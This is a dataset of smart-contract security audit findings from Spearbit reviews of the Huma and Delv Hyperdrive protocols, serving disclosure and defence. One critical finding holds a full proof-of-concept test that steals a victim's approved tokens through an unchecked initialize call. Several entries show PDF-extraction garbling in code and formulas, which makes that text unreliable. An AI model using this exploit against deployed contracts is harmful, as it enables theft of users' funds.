        "body": "During a loan's lifetime, the EA service account may update the yield charged on the borrowed funds. To avoid retroactively updating any previous accrued but not yet paid interest, the _updateYield() function will recompute yield due by taking into consideration how many days are remaining in the current billing period. If the yield rate is decreased during a billing period, then the new dd.accrued amount will have also decreased. If the borrower has already paid the yield owed in the current billing period, then dd.paid > dd.accrued may hold true. The protocol attempts to recalculate the yield due in the below snippet of code. Yield rate adjustments can happen during a billing cycle. function recomputeYieldDue( uint256 nextDueDate, uint256 oldYieldDue, uint256 oldYieldInBps, uint256 newYieldInBps, uint256 principal ) external view returns (uint256 updatedYield) {  uint256 daysRemaining = calendar.getDaysRemainingInPeriod(nextDueDate); // Note that we do not divide by rounds down. // We will do summation before division at the end for better precision. uint256 newYieldDueForDaysRemaining = principal * newYieldInBps * (daysRemaining - 1); uint256 oldYieldDueForDaysRemaining = principal * oldYieldInBps * (daysRemaining - 1); return (HUNDRED_PERCENT_IN_BPS * DAYS_IN_A_YEAR)  here since division (oldYieldDue * HUNDRED_PERCENT_IN_BPS * DAYS_IN_A_YEAR + newYieldDueForDaysRemaining - oldYieldDueForDaysRemaining) / (HUNDRED_PERCENT_IN_BPS * DAYS_IN_A_YEAR); ,! } Consequently, there is some excess yield paid that is not accounted for and remains locked within the protocol.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Implement boundary checks in setter functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The setter functions in the contract are designed for use by trusted accounts. However, there's still a risk of making incorrect updates due to human error or oversight. To mitigate this, it's essential to implement boundary checks for each setter function across all context files.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Redundant _onlyDeployer check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Upon deploying new pools, an internal call is made to _createPoolContracts() from deployPool(). However, there are some duplicate checks made which can be removed.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pool config read can be optimised by moving it within an if statement",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The _processEpoch() function will attempt to process junior tranche token redemption requests if the total requested amount is non-zero. The amount which can be claimed is enforced by the maxSeniorJuniorRatio pool config setting. This call can be optimised by moving it within the if statement for where it is known that junior tranche shares are being requested.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "In some endpoints all instances of borrower can be replaced with msg.sender after the check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "msg.sender. In the endpoints in this context, it is checked that the borrower should be the same as the",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Calculating the numMonths variable in getDaysRemainingInPeriod can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "DTL.diffMonths ignores the day portion of the Gregorian date so one can feed block.timestamp directly into DTL.diffMonths(unless there are some issues with the Julian day to/from Gregorian date conversions in the library).",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "One of the input parameters to _computeYieldNextDue can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The following expression can be simplified: cr.unbilledPrincipal + cr.nextDue - cr.yieldDue + dd.principalPastDue, We have: newDD = _deepCopyDueDetail(dd); // ... if (isLate) { if (timestamp > cr.nextDueDate) { // ... newDD.principalPastDue += cr.nextDue - cr.yieldDue; // ... cr.unbilledPrincipal + cr.nextDue - cr.yieldDue + dd.principalPastDue, // ... and so: newDD.principalPastDue == cr.nextDue - cr.yieldDue + dd.principalPastDue",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "latePaymentDeadline can be deferred in getNextBillRefreshDate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "latePaymentDeadline in getNextBillRefreshDate needs to be only calculated when: cr.state == CreditState.GoodStanding && cr.nextDue != 0 is true.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_onlySystemMoneyMover makes multiple calls to poolConfig to query different contract addresses.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "_onlySystemMoneyMover makes multiple calls to poolConfig to query different contract addresses: 23 function _onlySystemMoneyMover(address account) internal view { if ( account != poolConfig.seniorTranche() && account != poolConfig.juniorTranche() && account != poolConfig.credit() && account != poolConfig.poolFeeManager() && !poolConfig.isFirstLossCover(account) ) revert Errors.AuthorizedContractCallerRequired(); } resetUnprocessedProfit, addUnprocessedProfit, getAvailableBalanceForPool also makes multiple calls to poolConfig.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "HUNDRED_PERCENT_IN_BPS - lpConfig.tranchesRiskAdjustmentInBps can be stored in the storage in- stead of lpConfig.tranchesRiskAdjustmentInBps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Only spot that lpConfig.tranchesRiskAdjustmentInBps is used it might be cheaper to store (HUN- DRED_PERCENT_IN_BPS - lpConfig.tranchesRiskAdjustmentInBps) in the storage instead.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant address(0) checks in contract creation in PoolFactory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The deployment of proxy contracts contains a double-check for address(0), these additional checks increase gas consumption and add to the bytecode without providing extra security or functionality.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization PoolFactory.sol#L648, PoolFactory.sol#L672,"
        ]
    },
    {
        "title": "Avoid roundtrip in EpochManager when tranche.currentRedemptionSummary is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "tranche.currentRedemptionSummary() is only used in the EpochManager contract and in the TrancheVault it calls back to EpochManager to get the current epoch id.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_daysFromDate's and _daysToDate's implementations would need to be verified and tested",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Due to lack of time the integrity of the implementation of the functions in this context are not verified:  _daysFromDate  _daysToDate",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "getDaysDiff has a constraint which is not enforced",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "It is possible that startDate > endDate holds true if block.timestamp > endDate && startDate == 0. This should not be something that is allowed.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Evaluation agent can avoid being removed from PoolConfig",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "A pool's evaluation agent is tasked with underwriting risk associated with the pool. The pool owner or huma master admin can set a new evaluation agent by calling setEvaluationAgent(). If the old EA account has withdrawable funds, then withdrawEAFee() will be called. If this account can intentionally cause this to revert, then they can also avoid being removed altogether.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Potential underflow in seniorAvailableCap when a junior tranche defaults on a loan",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The seniorAvailableCap calculation will potentially revert by underflowing if the junior tranche ex- periences any loan default that causes assets[JUNIOR_TRANCHE] * config.maxSeniorJuniorRatio to fall below the amount of assets held by the senior tranche. uint256 seniorAvailableCap = assets[JUNIOR_TRANCHE] * config.maxSeniorJuniorRatio - assets[SENIOR_TRANCHE];",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pool config account naming can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The naming conventions for the pool config admin accounts can be confusing and do not necessarily clearly outline the implementation behaviour.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improper permissioning of withdrawProtocolFee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The protocol fee can be withdrawn by the huma config owner. This account is permissioned to make any configuration change to the protocol and should not be used for other purposes such as claiming a protocol fee.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "coveredLoss parameter shadows storage variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The variable naming of the coveredLoss parameter in the _calcLossRecovery() function shadows an existing storage variable.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "recoverLoss and coverLoss functions can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "These functions add some unnecessary steps to a simple calculation.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistency of allowed callers to makePrincipalPayment...",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "_onlySentinelServiceAccount() can call makePrincipalPayment endpoint in CreditLine. This is in contrast to makePrincipalPaymentWithReceivable in ReceivableBackedCreditLine where only the borrower can call into.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "One can call declarePayment to set receivableInfo.paidAmount to any value below the set cap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "There is no on-chain payment associated to this endpoint and the token owner can set the re- ceivableInfo.paidAmount to any desired value capped to receivableInfo.receivableAmount. receivable- Info.paidAmount is not even used in the protocol codebase.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "makePrincipalPaymentAndDrawdownWithReceivable makes msg.sender send and receive the same amount of underlying token to the poolSafe and back",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "borrower is checked to be the msg.sender. These two lines would transfer the same amount of the underlying token from the msg.sender to the pool safe and back. poolSafe.deposit(msg.sender, AMOUNT); poolSafe.withdraw(borrower, AMOUNT);",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Setter functions for creditDueManager and creditManager are missing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Setter functions for creditDueManager and creditManager are missing.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "poolAdmins storage parameter can be removed from HumaConfig",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "poolAdmins and related functions are not used.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "The check to set humaTreasury is different than the other endpoints",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "When one sets the humaTreasury the new and old values are compared and if they are not equal humaTreasury is updated. This differs from other endpoints where the comparison is not performed for example eaServiceAccount, eaNFTContractAddress.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Make sure safeTransferFrom and transferFrom in EvaluationAgentNFT would revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Other contracts in the codebase when one wants to transfer tokens, the implementation would cause a revert. Reverting might be a better implementation compared to a silent noop execution since the calling user/party might assume that the transfer had happened successfully.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Conditional statement in _checkDrawdownEligibility can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In this context we have: if (cr.nextDueDate > 0 && block.timestamp < cr.nextDueDate) revert Errors.FirstDrawdownTooEarly(); block.timestamp < cr.nextDueDate being true implies that cr.nextDueDate > 0.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simpler expression to update cr.nextDue in _makePrincipalPayment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In this context we have: uint256 principalDue = cr.nextDue - cr.yieldDue; // ... uint256 principalDuePaid; // ... } else { principalDuePaid = principalDue; // ... cr.nextDue = uint96(cr.nextDue - principalDuePaid);",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused elements of the ReceivableState enum",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Only Minted, Approved, PartiallyPaid, and Paid elements of ReceivableState are used.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Credit limit invariant should be checked within _updateLimitAndCommitment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "if (committedAmount > creditLimit) revert Errors.CommittedAmountGreaterThanCreditLimit(); _updateLimitAndCommitment(getCreditHash(borrower), creditLimit, committedAmount); The above check should happen atomically within the update flow and not just to this specific endpoint of Credit- LineManager.updateLimitAndCommitment.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use underscore prefix for internal functions across the codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In the context above the internal function names do not start with an underscore _.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use nested if blocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In _approveCredit we have: if (committedAmount == 0 && designatedStartDate != 0) revert Errors.CreditWithoutCommitmentShouldHaveNoDesignatedStartDate(); if (designatedStartDate > 0 && block.timestamp > designatedStartDate) revert Errors.DesignatedStartDateInThePast(); if (designatedStartDate > 0 && remainingPeriods <= 1) { // Business rule: do not allow credits with designated start date to have only 1 period. revert Errors.PayPeriodsTooLowForCreditsWithDesignatedStartDate(); } Since the conditional statements used here have a common condition of designatedStartDate > 0, one can refactor this condition into an outer if block.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid using inequalities when comparing an enum value to a set of enum values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In _approveCredit we have: if (cr.state > CreditState.Approved) revert Errors.CreditNotInStateForUpdate(); This approach of checking whether a state which an enum value is in a specific set is prone to future bugs in case enum elements are rearranged.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "_computeYieldNextDue can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In _computeYieldNextDue we are taking a maximum of a piece-wise linear function. And this case the maximum can be applied to the inputs to compute the maximum output: max xa b % , ya b %! $ $ = max $ xa b , ya b !% = $ max(x, y)a b %",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "updatePoolStatus does not validate the status transition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In updatePoolStatus the factory admin can update a pool's status to any of the below states except the Created status (which is the default 0 value and also used in the deployPool endpoint). enum PoolStatus { Created, // the pool is created but not initialized yet Initialized, // the pool is initialized and ready for use Closed // the pool is closed and not in operation anymore }",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "distributeLoss endpoint can be restricted to only the CreditManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The current Credit implementations do not call into distributeLoss.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the calendar and payment/interest calculations for both lenders and borrowers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The yield tracker in FixedSeniorYieldTranchePolicy follows a 365 calendar days for the liquidity lender side whereas on the borrow side most calculations follow the 30/360 calendar pattern.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The code contains inaccuracies and typos in comments, this affects code comprehension.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use constants instead of inline numbers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "When using numbers, it should be made clear what the number represents by storing it as a constant variable. Use named constants instead of inline numbers for clearer, more understandable code.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove redundant return",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Adding a return statement when the function defines a named return variable is redundant and can be removed.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid Duplicated code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "ReceivableBackedCreditLine and CreditLine both have getCreditHash function.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused events, enums, constants and errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Some events, enums, constants, and errors have been declared but are never used in the con- tract's functions, consider removing or using them.  Events: HumaConfig.ProtocolDefaultGracePeriodChanged, Credit.CreditInitiated, Credit.CreditLineChanged, Pool.PoolAssetsRefreshed.  Enums: CreditStructs.PaymentStatus, CreditStructs.CreditClosureReason.  Constants: SharedDefs.MAX_PERIODS, ReceivableFactoringCredit.PAYER_ROLE DurationTooLong,  Errors: match, NotTradableStreamOwner, tAvailableFlowRate, AuthorizationExpired, InvalidAuthorization, NewReceiverSameToOrigin. FlowKeyMis- InvalidSuperfluidAction, Insufficien- InvalidSuperfluidCallback, TradableStreamNotExisting, TradableStreamNotMatured, FlowIsNotTerminated, BorrowerMismatch, InvalidFlowRate, OnlySuperfluid,",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Floating pragma",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The project contains many instances of floating pragma. To maintain consistency and avoid potential bugs, contracts should be deployed using the same compiler version and configuration as used during thorough testing. Floating pragma can lead to unintended deployments with outdated compiler versions, introducing bugs, or with versions incompatible with certain EVM chains.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Counters.sol is deprecated in most recent OZ version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The recent version of OZ library 5.0.0, removed Counters library. The code will break in case updating the OZ version.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Informational"
        ]
    },
    {
        "title": "Tokens for deployment contribution can be stolen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The Hyperdrive factory deployment process involves several contracts: Factory ! DeployerCo- ordinator ! InstanceCoreDeployer. The initial contribution token transfer is done in the DeployerCoordina- tor.initialize() function. Users have to set approvals for this contract. The token transfer is performed in the instance-overridden _prepareInitialize function with the _lp parameter of the public initialize function as the token owner. function initialize( bytes32 _deploymentId, address _lp, uint256 _contribution, uint256 _apr, IHyperdrive.Options memory _options ) external payable returns (uint256 lpShares) { // ... // Prepare for initialization by drawing funds from the user. uint256 value = _prepareInitialize( hyperdrive, _lp, _contribution, _options ); // ... return lpShares; } function _prepareInitialize( IHyperdrive _hyperdrive, address _lp, uint256 _contribution, IHyperdrive.Options memory _options ) internal override returns (uint256) { // ... // uses parameter. ERC20(token).safeTransferFrom(_lp, address(this), _contribution); as the is parameter to the public from _lp _lp        initialize  function // ... return 0; } It's possible for an attacker to transfer funds from any user that approved the contract by directly calling the De- ployerCoordinator.initialize(_lp = victim) function. Legitimate deployments by the victims can either be frontrun or lingering approvals of existing deployments can be used. The funds will always be transferred to a Hyperdrive instance, however, the attacker can control the deployment parameters of this instance and simply set the initial LP receiver to themself and withdraw the LP shares again. Proof of concept: Bob steal's Alice's funds. // SPDX-License-Identifier: Apache-2.0 4 pragma solidity 0.8.20; import {ERC4626HyperdriveCoreDeployer} from ,! import {ERC4626HyperdriveDeployerCoordinator} from \"contracts/src/deployers/erc4626/ERC4626HyperdriveCoreDeployer.sol\"; \"contracts/src/deployers/erc4626/ERC4626HyperdriveDeployerCoordinator.sol\"; import {ERC4626Target0Deployer} from \"contracts/src/deployers/erc4626/ERC4626Target0Deployer.sol\"; import {ERC4626Target1Deployer} from \"contracts/src/deployers/erc4626/ERC4626Target1Deployer.sol\"; import {ERC4626Target2Deployer} from \"contracts/src/deployers/erc4626/ERC4626Target2Deployer.sol\"; import {ERC4626Target3Deployer} from \"contracts/src/deployers/erc4626/ERC4626Target3Deployer.sol\"; import {ERC4626Target4Deployer} from \"contracts/src/deployers/erc4626/ERC4626Target4Deployer.sol\"; import {HyperdriveFactory} from \"contracts/src/factory/HyperdriveFactory.sol\"; import {ERC4626Target0} from \"contracts/src/instances/erc4626/ERC4626Target0.sol\"; import {ERC4626Target1} from \"contracts/src/instances/erc4626/ERC4626Target1.sol\"; import {ERC4626Target2} from \"contracts/src/instances/erc4626/ERC4626Target2.sol\"; import {ERC4626Target3} from \"contracts/src/instances/erc4626/ERC4626Target3.sol\"; import {ERC4626Target4} from \"contracts/src/instances/erc4626/ERC4626Target4.sol\"; import {IERC20} from \"contracts/src/interfaces/IERC20.sol\"; import {IERC4626} from \"contracts/src/interfaces/IERC4626.sol\"; import {IERC4626Hyperdrive} from \"contracts/src/interfaces/IERC4626Hyperdrive.sol\"; import {IHyperdrive} from \"contracts/src/interfaces/IHyperdrive.sol\"; import {IHyperdriveDeployerCoordinator} from ,! import {AssetId} from \"contracts/src/libraries/AssetId.sol\"; import {FixedPointMath, ONE} from \"contracts/src/libraries/FixedPointMath.sol\"; import {HyperdriveMath} from \"contracts/src/libraries/HyperdriveMath.sol\"; import {ERC20ForwarderFactory} from \"contracts/src/token/ERC20ForwarderFactory.sol\"; import {ERC20Mintable} from \"contracts/test/ERC20Mintable.sol\"; import {MockERC4626, ERC20} from \"contracts/test/MockERC4626.sol\"; import {MockERC4626Hyperdrive} from \"contracts/test/MockERC4626Hyperdrive.sol\"; import {HyperdriveTest} from \"test/utils/HyperdriveTest.sol\"; import {HyperdriveUtils} from \"test/utils/HyperdriveUtils.sol\"; \"contracts/src/interfaces/IHyperdriveDeployerCoordinator.sol\"; import {ERC4626HyperdriveTest} from \"./ERC4626Hyperdrive.t.sol\"; contract SpearbitDeploymentTest is ERC4626HyperdriveTest { using FixedPointMath for *; function test_erc4626_deployAttack() external { // Alice approves the deployer coordinator, Bob steals her funds vm.startPrank(alice); dai.approve(address(deployerCoordinator), type(uint256).max); vm.stopPrank(); vm.startPrank(bob); uint256 apr = 0.01e18; // 1% apr uint256 contribution = 2_500e18; uint256 timeStretch = uint256(5.24592e18).divDown(uint256(0.04665e18)); IHyperdrive.PoolDeployConfig memory config = IHyperdrive.PoolDeployConfig({ baseToken: dai, linkerFactory: factory.linkerFactory(), linkerCodeHash: factory.linkerCodeHash(), minimumShareReserves: ONE, minimumTransactionAmount: 0.001e18, positionDuration: 365 days, checkpointDuration: 1 days, timeStretch: timeStretch, governance: factory.hyperdriveGovernance(), feeCollector: factory.feeCollector(), sweepCollector: factory.sweepCollector(), fees: IHyperdrive.Fees(0, 0, 0, 0) }); 5 bytes32 deploymentId = bytes32(uint256(0xdeadbeef)); bytes memory extraData = abi.encode(address(pool)); // deploy hyperdrive directly through the deployer coordinator for (uint256 targetIndex = 0; targetIndex < 5; targetIndex++) { IHyperdriveDeployerCoordinator(deployerCoordinator).deployTarget( deploymentId, config, extraData, targetIndex, deploymentId ); } hyperdrive = IHyperdrive( IHyperdriveDeployerCoordinator(deployerCoordinator).deploy(deploymentId, config, extraData, ,! deploymentId) ); // call initialize with _lp = victim, options.destination = attacker uint256 lpShares = IHyperdriveDeployerCoordinator(deployerCoordinator).initialize( deploymentId, alice, contribution, apr, IHyperdrive.Options({asBase: true, destination: bob, extraData: new bytes(0)}) ); hyperdrive.removeLiquidity( lpShares, 0, IHyperdrive.Options({asBase: true, destination: bob, extraData: new bytes(0)}) ); assertEq(dai.balanceOf(bob), contribution - 2 * config.minimumShareReserves, \"!dai balance\"); } }",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "calculateDistributeExcessIdleShareProceeds might return shareProceeds that break LP price in- variant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "Step 3 of calculateDistributeExcessIdle computes the withdrawal shares dw that can be re- moved along with removing dz_max vault shares to keep the LP price PV / L constant. If the withdrawal shares dw are more than the total outstanding withdrawal shares w, the inverse problem of finding dz given w is solved in step 4. Solving this problem is harder and Newton's method is used to solve F(dz) = 0 with F (dz) = PV(dz) (cid:1) l (cid:0) PV(0) (cid:1) (l (cid:0) w). A fixed number of SHARE_PROCEEDS_MAX_ITERATIONS iterations is used and calculateDistributeExces- sIdleShareProceeds can return a dz that is not the solution, and therefore does not keep the LP price constant, breaking the invariant.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Maximum and minimum fee checks are less strict than expected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The fee validation logic uses different rounding strategies (down for maximum checks, up for mini- mum checks) to enforce fee constraints. This approach might intuitively seem to make the validation stricter, but the effect of rounding down when comparing against the maximum fee actually makes the condition less strict, allowing more values to pass the check. The same effect happens on the validation against the minimum but rounding up, leading to a less strict condition.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ETH withdrawals are not reliable on RETHBase.sol::_withdrawWithBase()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The _withdrawWithBase function might withdrawals only of unused or excess balance, leading to users unable to withdraw their ETH. While withdrawWithShares offers an alternative, users may still encounter unexpected restrictions using the direct withdrawal path, leading to potential confusion.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "salt provided to an IHyperdriveTargetDeployer is not mixed/hashed with other parameters to avoid griefing attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The salt provided totarget_X_Deployer in this context is not hashed with other parameter to prevent-front running DoS/griefing attacks. This is unlike the deployment for the Hyperdrive and target0.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cache storage variables that are read multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-March-2024.pdf",
        "body": "The storage parameters _feeCollector in _collectGovernanceFee and _sweepCollector in _- sweep are read multiple times. These parameters used to be an immutable variables and so it would have made sense just inlining them. But for storage parameters it would make sense to cache them on the stack and use the stack variables.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "calculateSharesDeltaGivenBondsDeltaDerivativeSafe returns failure for successful edge case",
